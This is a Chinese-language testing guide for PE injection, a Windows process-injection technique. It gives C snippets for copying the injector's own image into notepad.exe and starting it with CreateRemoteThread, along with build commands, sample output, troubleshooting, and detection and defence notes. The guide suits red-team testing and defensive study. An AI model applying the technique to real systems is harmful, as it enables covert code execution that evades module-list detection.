# 技术 16: PE Injection (Loaded Module Reflection) 测试指南

## 技术概述

**PE Injection** (PE注入/加载模块反射) 是一种进程注入技术，通过将完整的PE映像复制到目标进程并执行，实现代码注入。不同于反射DLL注入，这种技术**不处理导入表和重定位表**，依赖目标进程已加载的DLL。

### 核心原理

1. 读取PE文件或当前进程映像到内存
2. 在目标进程分配RWX内存
3. 修改PE头中的ImageBase为目标地址
4. 将完整PE映像写入目标进程
5. 计算入口点偏移（main/WinMain/DllMain）
6. 创建远程线程执行入口点

### 关键特性

- **不使用LoadLibrary**：PE直接加载到内存
- **不在模块列表中**：无法通过枚举模块发现
- **不处理IAT**：必须动态解析API（GetProcAddress）
- **不处理重定位**：只修改ImageBase字段
- **依赖目标环境**：需要目标进程已加载相应DLL

### 与其他技术对比

| 特性 | PE Injection | Reflective DLL | DLL Injection |
|------|--------------|----------------|---------------|
| LoadLibrary | 否 | 否 | 是 |
| 处理IAT | 否 | 是 | 否 |
| 处理重定位 | 否 | 是 | 否 |
| 模块列表 | 不可见 | 不可见 | 可见 |
| 复杂度 | 低 | 高 | 低 |
| 稳定性 | 中等 | 高 | 高 |

## 实现方式

### 方式一：Self-Injection（推荐）

注入器将自己的PE映像复制到目标进程。

**优点**：
- 代码统一，易于维护
- Main函数在目标进程中执行
- 可以使用全局变量控制流程

**实现文件**：`src/pe_inject_self.c`

**关键代码**：
```c
BOOL g_Inserted = FALSE;  // 全局标志

int main(int argc, char** argv) {
    if (!g_Inserted) {
        // 第一次调用：在本地进程
        // 复制自己到目标进程
        CopyImageToTargetProcess(targetPid);
        exit(0);
    }

    // 第二次调用：在目标进程
    // 执行payload逻辑（必须用GetProcAddress）
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    pCreateFileA _CreateFileA = (pCreateFileA)GetProcAddress(hKernel32, "CreateFileA");
    // ...
}
```

### 方式二：External Payload（原实现）

读取独立的payload.exe并注入。

**问题**：
- Payload的IAT在目标进程中无效
- 直接调用Windows API会崩溃
- 需要payload自己从PEB解析kernel32

**实现文件**：`src/pe_inject.c` + `src/payload.c`

**失败原因**：
PE Injection不修复IAT，payload中的函数指针全部无效。即使simplest的CreateFileA调用也会访问非法地址。

## 测试步骤

### 环境准备

```bash
cd techniques/16-pe-injection
```

### 编译项目

使用build.bat：
```bash
./build.bat
```

或手动编译：
```bash
# Self-injection版本（推荐）
gcc -o pe_inject_self.exe src/pe_inject_self.c -lkernel32 -lpsapi -m64 -O2

# External payload版本（不推荐，会失败）
gcc -o pe_inject.exe src/pe_inject.c -lkernel32 -lpsapi -m64 -O2
gcc -o payload.exe src/payload.c -lkernel32 -m64 -O2
```

### 执行测试

#### 方法一：使用进程名

```bash
# 启动目标进程
notepad.exe &

# 执行注入（self-injection）
./pe_inject_self.exe notepad.exe
```

#### 方法二：使用PID

```bash
# 获取PID
tasklist | grep -i "notepad.exe"
# 输出：Notepad.exe   109144 Console  13  112,888 K

# 执行注入
./pe_inject_self.exe 109144
```

### 验证成功

检查验证文件：
```bash
cat /c/Users/Public/pe_injection_verified.txt
```

**成功输出示例**：
```
PE Injection Verified!
Process ID: 109144
Technique: PE Injection (Loaded Module Reflection)
Method: Self-injection with dynamic API resolution
Status: Successfully executed in target process!
```

## 测试结果

### 成功案例

| 测试时间 | 目标进程 | PID | 结果 | 备注 |
|---------|---------|-----|------|------|
| 2025-xx-xx | notepad.exe | 109144 | ✅ 成功 | Self-injection + GetProcAddress |

**输出**：
```
========================================
  PE Injection - Self Injection
  将自身注入到目标进程
========================================

[*] 目标进程 PID: 109144
[*] 当前进程映像大小: 81920 字节
[+] 远程内存分配: 0x0000025E647F0000
[+] 已写入 81920 字节
[*] Main 偏移: 0x2E10
[*] 远程 Main: 0x25E647F2E10
[+] 远程线程已创建: TID=97632
[+] PE 注入成功!
```

### 失败案例

| 测试时间 | 方法 | 结果 | 原因 |
|---------|------|------|------|
| 2025-xx-xx | External payload (payload.exe) | ❌ 失败 | IAT未修复，API调用崩溃 |

**现象**：
- 注入器报告成功
- 远程线程创建成功
- 但验证文件未生成
- Payload在第一次API调用时崩溃

## 关键技术点

### 1. IAT问题与解决

**问题**：
PE Injection不处理IAT，所有导入函数地址无效。

**解决方案**：
在目标进程中动态解析API：

```c
// 正确：动态解析
HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
pCreateFileA _CreateFileA = (pCreateFileA)GetProcAddress(hKernel32, "CreateFileA");
_CreateFileA("C:\\file.txt", ...);

// 错误：直接调用（会崩溃）
CreateFileA("C:\\file.txt", ...);
```

### 2. 全局变量控制流程

**问题**：
Main函数被调用两次，如何区分运行上下文？

**解决方案**：
使用全局变量，在复制前设置为TRUE：

```c
BOOL g_Inserted = FALSE;

// 复制前
g_Inserted = TRUE;  // 必须在memcpy之前！
memcpy(shadow_proc, baseAddress, imageSize);

// Main函数
if (!g_Inserted) {
    // 本地进程：执行注入
} else {
    // 目标进程：执行payload
}
```

### 3. ImageBase修改

**关键步骤**：
1. 修改本地PE头的ImageBase
2. 复制到影子缓冲区
3. 恢复本地PE头
4. 写入目标进程

```c
pNtHeaders->OptionalHeader.ImageBase = (DWORD_PTR)newImageAddress;
memcpy(shadow_proc, baseAddress, imageSize);
// ImageBase已在影子缓冲区中更新
```

### 4. 入口点计算

```c
// 计算main函数相对于模块基址的偏移
UINT64 mainOffset = (UINT64)main - (UINT64)moduleInfo.lpBaseOfDll;

// 重定位到目标进程
UINT64 rebased_main = (UINT64)newImageAddress + mainOffset;

// 创建线程执行
CreateRemoteThread(targetProc, NULL, 0, (LPTHREAD_START_ROUTINE)rebased_main, NULL, 0, &threadId);
```

## 常见问题

### Q1: 为什么payload.exe注入后没有反应？

**A**: PE Injection不处理IAT。Payload中任何直接的Windows API调用（如CreateFileA、GetCurrentProcessId）都会访问无效地址导致崩溃。必须使用GetProcAddress动态解析。

### Q2: GetModuleHandleA和GetProcAddress本身不也依赖IAT吗？

**A**: 是的。解决方案：
1. **Self-injection方式**：注入器本身的CRT已初始化，可以直接调用
2. **Manual方式**：从PEB手动遍历模块列表，手动解析导出表

### Q3: 为什么必须在memcpy之前设置g_Inserted？

**A**: 因为memcpy会复制所有全局变量的值。如果在memcpy后设置，影子缓冲区中的值仍是FALSE。

### Q4: 这种技术和Reflective DLL有什么区别？

**A**:
- **Reflective DLL**: 完整实现PE Loader，处理IAT/重定位/TLS，高度兼容
- **PE Injection**: 简单复制，不处理IAT/重定位，依赖目标环境，但更隐蔽

### Q5: 目标进程需要什么条件？

**A**:
1. 必须已加载你需要的DLL（如kernel32.dll、user32.dll）
2. 架构匹配（x64 to x64 / x86 to x86）
3. 有足够权限（通常需要管理员）

## 检测与防御

### 检测方法

1. **内存扫描**：扫描未注册模块的可执行内存
2. **线程监控**：检测CreateRemoteThread调用
3. **行为分析**：检测异常的API调用模式
4. **TLS Callback**：阻止未知线程执行
5. **ETW监控**：虽然无LoadLibrary事件，但有VirtualAllocEx/WriteProcessMemory

### 防御建议

1. **进程保护**：
   - 使用Protected Process Light (PPL)
   - 限制OpenProcess权限

2. **内存监控**：
   - 监控RWX内存分配
   - 扫描未注册的PE结构

3. **线程管理**：
   - 使用TLS回调验证线程来源
   - 限制CreateRemoteThread

## 参考资料

- 原始实现：https://github.com/AlSch092/PE-Injection
- ired.team文档：https://www.ired.team/offensive-security/code-injection-process-injection/pe-injection-executing-pes-inside-remote-processes
- README: `techniques/16-pe-injection/README.md`
- 源代码：
  - Self-injection: `src/pe_inject_self.c`
  - External payload: `src/pe_inject.c` + `src/payload.c`

## 总结

PE Injection是一种简单但有效的注入技术。虽然不处理IAT导致需要动态解析API，但正因为简单，所以更难被检测。**Self-injection方式**是推荐的实现方法，结合GetProcAddress可以绕过IAT限制，成功在目标进程中执行代码。

**关键要点**：
- ✅ 使用Self-injection模式
- ✅ 用GetProcAddress动态解析API
- ✅ 用g_Inserted控制流程
- ✅ 在memcpy前设置标志
- ❌ 不要直接调用Windows API
- ❌ 不要依赖IAT
